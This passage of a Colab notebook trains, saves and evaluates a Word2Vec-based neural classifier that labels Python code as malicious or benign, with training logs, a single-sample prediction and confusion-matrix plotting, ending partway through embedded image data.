              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Training model on df_mal dataset...\n",
            "Epoch 1/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m4s\u001b[0m 19ms/step - accuracy: 0.7384 - loss: 0.4959 - val_accuracy: 0.8169 - val_loss: 0.4218\n",
            "Epoch 2/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.8585 - loss: 0.3586 - val_accuracy: 0.9521 - val_loss: 0.1584\n",
            "Epoch 3/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9610 - loss: 0.1283 - val_accuracy: 0.9775 - val_loss: 0.0863\n",
            "Epoch 4/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9754 - loss: 0.0769 - val_accuracy: 0.9746 - val_loss: 0.0822\n",
            "Epoch 5/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9587 - loss: 0.1346 - val_accuracy: 0.9831 - val_loss: 0.0675\n",
            "Epoch 6/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 9ms/step - accuracy: 0.9604 - loss: 0.1290 - val_accuracy: 0.9746 - val_loss: 0.0821\n",
            "Epoch 7/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9815 - loss: 0.0626 - val_accuracy: 0.8761 - val_loss: 0.4897\n",
            "Epoch 8/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9148 - loss: 0.2760 - val_accuracy: 0.9521 - val_loss: 0.1317\n",
            "Epoch 9/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 9ms/step - accuracy: 0.9720 - loss: 0.1075 - val_accuracy: 0.9803 - val_loss: 0.0702\n",
            "Epoch 10/10\n",
            "\u001b[1m45/45\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m1s\u001b[0m 9ms/step - accuracy: 0.9842 - loss: 0.0552 - val_accuracy: 0.9775 - val_loss: 0.0751\n",
            "\n",
            "Test Accuracy (df_mal dataset): 97.52%\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pickle\n",
        "import os\n",
        "import numpy as np\n",
        "from gensim.models import Word2Vec # Import Word2Vec\n",
        "\n",
        "# Load the pre-trained Word2Vec model\n",
        "# Assuming workspace_path is already defined and contains the 'model' folder\n",
        "model_path = os.path.join(workspace_path, 'word2vec_withString10-6-100.model')\n",
        "try:\n",
        "    w2v_model = Word2Vec.load(model_path)\n",
        "    print(f\"Word2Vec model loaded successfully from {model_path}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: Model file not found at {model_path}\")\n",
        "    w2v_model = None\n",
        "\n",
        "# Select a random row from the df_mal DataFrame\n",
        "random_row_mal = df_mal.sample(1).iloc[0]\n",
        "\n",
        "# Get the actual label\n",
        "actual_label_mal = random_row_mal['label']\n",
        "\n",
        "# Get the source code\n",
        "source_code_mal = random_row_mal['code']\n",
        "\n",
        "print(f\"--- Analyzing a random sample from df_mal (Actual Label: {actual_label_mal}) ---\")\n",
        "# Removed the line that prints the source code snippet: print(\"Source Code snippet:\")\n",
        "# Removed the line that prints the source code snippet: print(source_code_mal[:500] + \"...\") # Display a snippet of the code\n",
        "\n",
        "# Preprocess the source code: tokenize, embed, and pad\n",
        "tokenized_code_mal = tokenize_python(source_code_mal)\n",
        "\n",
        "# Ensure w2v_model was loaded successfully\n",
        "if w2v_model:\n",
        "    embedded_code_mal = embed_sequences([tokenized_code_mal], w2v_model) # embed_sequences expects a list of sequences\n",
        "    if embedded_code_mal and len(embedded_code_mal) > 0 and embedded_code_mal[0].size > 0:\n",
        "        # Pad the embedded sequence\n",
        "        max_sequence_length = 100 # Use the same max length as training\n",
        "        embedding_dim = w2v_model.vector_size\n",
        "        padded_code_mal = np.zeros((max_sequence_length, embedding_dim)) # Initialize with zeros\n",
        "\n",
        "        embedded_sequence_mal = embedded_code_mal[0]\n",
        "        if embedded_sequence_mal.shape[0] > 0:\n",
        "            # Calculate padding needed\n",
        "            padding_length = max_sequence_length - embedded_sequence_mal.shape[0]\n",
        "            if padding_length > 0:\n",
        "                # Create padding of zero vectors\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                # Concatenate original sequence with padding\n",
        "                padded_code_mal = np.concatenate((embedded_sequence_mal, padding), axis=0)\n",
        "            else:\n",
        "                # Truncate if sequence is longer than max_sequence_length\n",
        "                padded_code_mal = embedded_sequence_mal[:max_sequence_length]\n",
        "\n",
        "        # Reshape for prediction (add batch dimension)\n",
        "        padded_code_mal = np.expand_dims(padded_code_mal, axis=0)\n",
        "\n",
        "        # Load the saved model_mal from the 'model' folder\n",
        "        model_save_dir = os.path.join(workspace_path, 'model')\n",
        "        model_mal_path = os.path.join(model_save_dir, 'model_mal.pkl')\n",
        "        label_encoder_mal_path = os.path.join(model_save_dir, 'label_encoder_mal.pkl')\n",
        "\n",
        "        try:\n",
        "            with open(model_mal_path, 'rb') as f:\n",
        "                loaded_model_mal = pickle.load(f)\n",
        "            with open(label_encoder_mal_path, 'rb') as f:\n",
        "                loaded_label_encoder_mal = pickle.load(f)\n",
        "\n",
        "            # Make a prediction using the loaded model_mal\n",
        "            prediction_mal = loaded_model_mal.predict(padded_code_mal)\n",
        "            predicted_probability_mal = prediction_mal[0][0] # Get the probability for the positive class (malicious)\n",
        "\n",
        "            # For binary classification, we threshold the probability\n",
        "            predicted_label_index_mal = (predicted_probability_mal > 0.5).astype(int)\n",
        "\n",
        "            # Convert the predicted class index back to the original label (malicious/benign)\n",
        "            predicted_label_mal = loaded_label_encoder_mal.inverse_transform([predicted_label_index_mal])[0]\n",
        "\n",
        "            print(f\"\\nPredicted Probability (Malicious): {predicted_probability_mal:.4f}\")\n",
        "            print(f\"Predicted Label: {predicted_label_mal}\")\n",
        "\n",
        "        except FileNotFoundError:\n",
        "            print(f\"Error: model_mal.pkl or label_encoder_mal.pkl not found in {model_save_dir}. Please ensure they are saved.\")\n",
        "        except Exception as e:\n",
        "            print(f\"An error occurred during model loading or prediction: {e}\")\n",
        "\n",
        "    else:\n",
        "        print(\"Error: Could not embed the source code from df_mal.\")\n",
        "else:\n",
        "    print(\"Error: Word2Vec model not loaded. Cannot embed sequences.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "92m85Y7aqh8L",
        "outputId": "db568bfd-7de8-4248-febd-f11c407fb537"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Word2Vec model loaded successfully from /content/drive/MyDrive/fortmp/word2vec_withString10-6-100.model\n",
            "--- Analyzing a random sample from df_mal (Actual Label: malicious) ---\n",
            "\u001b[1m1/1\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 177ms/step\n",
            "\n",
            "Predicted Probability (Malicious): 0.9950\n",
            "Predicted Label: malicious\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pickle\n",
        "import os\n",
        "\n",
        "# Define the directory to save models\n",
        "model_save_dir = os.path.join(workspace_path, 'model')\n",
        "os.makedirs(model_save_dir, exist_ok=True)\n",
        "\n",
        "# Define the file path for model_mal\n",
        "model_mal_path = os.path.join(model_save_dir, 'model_mal.pkl')\n",
        "label_encoder_mal_path = os.path.join(model_save_dir, 'label_encoder_mal.pkl')\n",
        "\n",
        "\n",
        "# Save model_mal if it exists\n",
        "if 'model_mal' in locals() and model_mal is not None:\n",
        "    with open(model_mal_path, 'wb') as f:\n",
        "        pickle.dump(model_mal, f)\n",
        "    print(f\"model_mal saved to {model_mal_path}\")\n",
        "else:\n",
        "    print(\"model_mal not found. Skipping save.\")\n",
        "\n",
        "# Save label_encoder_mal if it exists\n",
        "if 'label_encoder_mal' in locals() and label_encoder_mal is not None:\n",
        "    with open(label_encoder_mal_path, 'wb') as f:\n",
        "        pickle.dump(label_encoder_mal, f)\n",
        "    print(f\"label_encoder_mal saved to {label_encoder_mal_path}\")\n",
        "else:\n",
        "    print(\"label_encoder_mal not found. Skipping save.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "O5w7m62ksc6Z",
        "outputId": "cf18a6e4-22d6-4e33-a76f-096bfd1095d0"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "model_mal saved to /content/drive/MyDrive/fortmp/model/model_mal.pkl\n",
            "label_encoder_mal saved to /content/drive/MyDrive/fortmp/model/label_encoder_mal.pkl\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 시각화"
      ],
      "metadata": {
        "id": "AgUKT4S4ssDG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "import numpy as np\n",
        "import matplotlib.pyplot as plt\n",
        "import seaborn as sns\n",
        "from sklearn.metrics import confusion_matrix, classification_report\n",
        "from sklearn.preprocessing import LabelEncoder\n",
        "import pickle\n",
        "import os\n",
        "\n",
        "# Define the directory where models are saved\n",
        "model_save_dir = os.path.join(workspace_path, 'model')\n",
        "\n",
        "# Define specific file paths to load\n",
        "model_full_path_load = os.path.join(model_save_dir, 'model_full_20250918_063532.pkl')\n",
        "label_encoder_full_path_load = os.path.join(model_save_dir, 'label_encoder_full_20250918_063532.pkl')\n",
        "model_final_path_load = os.path.join(model_save_dir, 'model_final_20250918_063532.pkl')\n",
        "label_encoder_final_path_load = os.path.join(model_save_dir, 'label_encoder_final_20250918_063532.pkl')\n",
        "model_mal_path_load = os.path.join(model_save_dir, 'model_mal.pkl') # Assuming this one doesn't have timestamp yet\n",
        "label_encoder_mal_path_load = os.path.join(model_save_dir, 'label_encoder_mal.pkl') # Assuming this one doesn't have timestamp yet\n",
        "\n",
        "\n",
        "# Load the saved models and label encoders\n",
        "model_full = None\n",
        "model_final = None\n",
        "model_mal = None # Initialize model_mal as well\n",
        "label_encoder_full = None\n",
        "label_encoder_final = None\n",
        "label_encoder_mal = None # Initialize label_encoder_mal as well\n",
        "\n",
        "try:\n",
        "    with open(model_full_path_load, 'rb') as f:\n",
        "        model_full = pickle.load(f)\n",
        "    print(f\"model_full loaded successfully from {model_full_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {model_full_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(label_encoder_full_path_load, 'rb') as f:\n",
        "        label_encoder_full = pickle.load(f)\n",
        "    print(f\"label_encoder_full loaded successfully from {label_encoder_full_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {label_encoder_full_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(model_final_path_load, 'rb') as f:\n",
        "        model_final = pickle.load(f)\n",
        "    print(f\"model_final loaded successfully from {model_final_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {model_final_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(label_encoder_final_path_load, 'rb') as f:\n",
        "        label_encoder_final = pickle.load(f)\n",
        "    print(f\"label_encoder_final loaded successfully from {label_encoder_final_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {label_encoder_final_path_load} not found.\")\n",
        "\n",
        "# Attempt to load model_mal and its label encoder as well, assuming standard names\n",
        "try:\n",
        "    with open(model_mal_path_load, 'rb') as f:\n",
        "        model_mal = pickle.load(f)\n",
        "    print(f\"model_mal loaded successfully from {model_mal_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {model_mal_path_load} not found.\")\n",
        "\n",
        "try:\n",
        "    with open(label_encoder_mal_path_load, 'rb') as f:\n",
        "        label_encoder_mal = pickle.load(f)\n",
        "    print(f\"label_encoder_mal loaded successfully from {label_encoder_mal_path_load}\")\n",
        "except FileNotFoundError:\n",
        "    print(f\"Error: {label_encoder_mal_path_load} not found.\")\n",
        "\n",
        "\n",
        "# Function to plot confusion matrix\n",
        "def plot_confusion_matrix(y_true, y_pred, classes, title='Confusion Matrix'):\n",
        "    cm = confusion_matrix(y_true, y_pred)\n",
        "    plt.figure(figsize=(8, 6))\n",
        "    sns.heatmap(cm, annot=True, fmt='d', cmap='Blues', xticklabels=classes, yticklabels=classes)\n",
        "    plt.title(title)\n",
        "    plt.xlabel('Predicted Label')\n",
        "    plt.ylabel('True Label')\n",
        "    plt.show()\n",
        "\n",
        "# --- Confusion Matrix for model_full (df dataset) ---\n",
        "print(\"--- Confusion Matrix for model_full (CWE Classification) ---\")\n",
        "# Check if model and required test data are loaded/available\n",
        "if model_full is not None and 'X_test_full' in locals() and 'y_test_full' in locals() and label_encoder_full is not None:\n",
        "\n",
        "    # Get predictions\n",
        "    y_pred_full = model_full.predict(X_test_full)\n",
        "    y_pred_classes_full = np.argmax(y_pred_full, axis=1)\n",
        "    y_true_classes_full = np.argmax(y_test_full, axis=1) # y_test_full is one-hot encoded\n",
        "\n",
        "    # Convert numerical labels back to original class names for plotting\n",
        "    true_labels_full = label_encoder_full.inverse_transform(y_true_classes_full)\n",
        "    predicted_labels_full = label_encoder_full.inverse_transform(y_pred_classes_full)\n",
        "\n",
        "    # Get the unique class names from the label encoder\n",
        "    class_names_full = label_encoder_full.classes_\n",
        "\n",
        "    # Plot confusion matrix\n",
        "    plot_confusion_matrix(true_labels_full, predicted_labels_full, class_names_full, title='Confusion Matrix for model_full (CWE Classification)')\n",
        "\n",
        "    # Print classification report\n",
        "    print(\"\\nClassification Report for model_full:\")\n",
        "    print(classification_report(true_labels_full, predicted_labels_full, target_names=class_names_full))\n",
        "else:\n",
        "    print(\"Required variables (model_full, test data, label_encoder_full) for model_full analysis not found. Skipping.\")\n",
        "\n",
        "\n",
        "# --- Confusion Matrix for model_final (df_final dataset - Vulnerability Detection) ---\n",
        "print(\"\\n--- Confusion Matrix for model_final (Vulnerability Detection) ---\")\n",
        "# Check if model and required test data are loaded/available\n",
        "if model_final is not None and 'X_test_final' in locals() and 'y_test_final' in locals() and label_encoder_final is not None:\n",
        "\n",
        "    # Get predictions (probabilities for binary classification)\n",
        "    y_pred_final_probs = model_final.predict(X_test_final)\n",
        "    # Convert probabilities to binary predictions (0 or 1)\n",
        "    y_pred_final_classes = (y_pred_final_probs > 0.5).astype(int)\n",
        "\n",
        "    # y_test_final is already encoded numerical labels (0 or 1)\n",
        "    y_true_final_classes = y_test_final\n",
        "\n",
        "    # Convert numerical labels back to original class names ('benign', 'malicious') for plotting\n",
        "    # Ensure the classes in label_encoder_final are in the correct order (0: benign, 1: malicious)\n",
        "    # Based on previous runs, fit_transform applied to ['benign', 'malicious'] would encode 'benign' as 0 and 'malicious' as 1.\n",
        "    # Let's confirm this or get the classes from the encoder.\n",
        "    class_names_final = label_encoder_final.classes_\n",
        "\n",
        "\n",
        "    # Plot confusion matrix\n",
        "    plot_confusion_matrix(y_true_final_classes, y_pred_final_classes, class_names_final, title='Confusion Matrix for model_final (Vulnerability Detection)')\n",
        "\n",
        "    # Print classification report\n",
        "    print(\"\\nClassification Report for model_final:\")\n",
        "    print(classification_report(y_true_final_classes, y_pred_final_classes, target_names=class_names_final))\n",
        "\n",
        "else:\n",
        "    print(\"Required variables (model_final, test data, label_encoder_final) for model_final analysis not found. Skipping.\")\n",
        "\n",
        "\n",
        "# --- Confusion Matrix for model_mal (df_mal dataset - Malicious Code Detection) ---\n",
        "print(\"\\n--- Confusion Matrix for model_mal (Malicious Code Detection) ---\")\n",
        "# Check if model and required test data are loaded/available\n",
        "if model_mal is not None and 'X_test_mal' in locals() and 'y_test_mal' in locals() and label_encoder_mal is not None:\n",
        "\n",
        "    # Get predictions (probabilities for binary classification)\n",
        "    y_pred_mal_probs = model_mal.predict(X_test_mal)\n",
        "    # Convert probabilities to binary predictions (0 or 1)\n",
        "    y_pred_mal_classes = (y_pred_mal_probs > 0.5).astype(int)\n",
        "\n",
        "    # y_test_mal is already encoded numerical labels (0 or 1)\n",
        "    y_true_mal_classes = y_test_mal\n",
        "\n",
        "    # Convert numerical labels back to original class names ('benign', 'malicious') for plotting\n",
        "    # Ensure the classes in label_encoder_mal are in the correct order\n",
        "    class_names_mal = label_encoder_mal.classes_\n",
        "\n",
        "\n",
        "    # Plot confusion matrix\n",
        "    plot_confusion_matrix(y_true_mal_classes, y_pred_mal_classes, class_names_mal, title='Confusion Matrix for model_mal (Malicious Code Detection)')\n",
        "\n",
        "    # Print classification report\n",
        "    print(\"\\nClassification Report for model_mal:\")\n",
        "    print(classification_report(y_true_mal_classes, y_pred_mal_classes, target_names=class_names_mal))\n",
        "\n",
        "else:\n",
        "    print(\"Required variables (model_mal, test data, label_encoder_mal) for model_mal analysis not found. Skipping.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "Lm1TvVOasrQK",
        "outputId": "4bcda366-4f02-4f77-f9d7-f956a3a76656"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "model_full loaded successfully from /content/drive/MyDrive/fortmp/model/model_full_20250918_063532.pkl\n",
            "label_encoder_full loaded successfully from /content/drive/MyDrive/fortmp/model/label_encoder_full_20250918_063532.pkl\n",
            "model_final loaded successfully from /content/drive/MyDrive/fortmp/model/model_final_20250918_063532.pkl\n",
            "label_encoder_final loaded successfully from /content/drive/MyDrive/fortmp/model/label_encoder_final_20250918_063532.pkl\n",
            "model_mal loaded successfully from /content/drive/MyDrive/fortmp/model/model_mal.pkl\n",
            "label_encoder_mal loaded successfully from /content/drive/MyDrive/fortmp/model/label_encoder_mal.pkl\n",
            "--- Confusion Matrix for model_full (CWE Classification) ---\n",
            "Required variables (model_full, test data, label_encoder_full) for model_full analysis not found. Skipping.\n",
            "\n",
            "--- Confusion Matrix for model_final (Vulnerability Detection) ---\n",
            "Required variables (model_final, test data, label_encoder_final) for model_final analysis not found. Skipping.\n",
            "\n",
            "--- Confusion Matrix for model_mal (Malicious Code Detection) ---\n",
            "\u001b[1m14/14\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 18ms/step\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x600 with 2 Axes>"
            ],
            "image/png": "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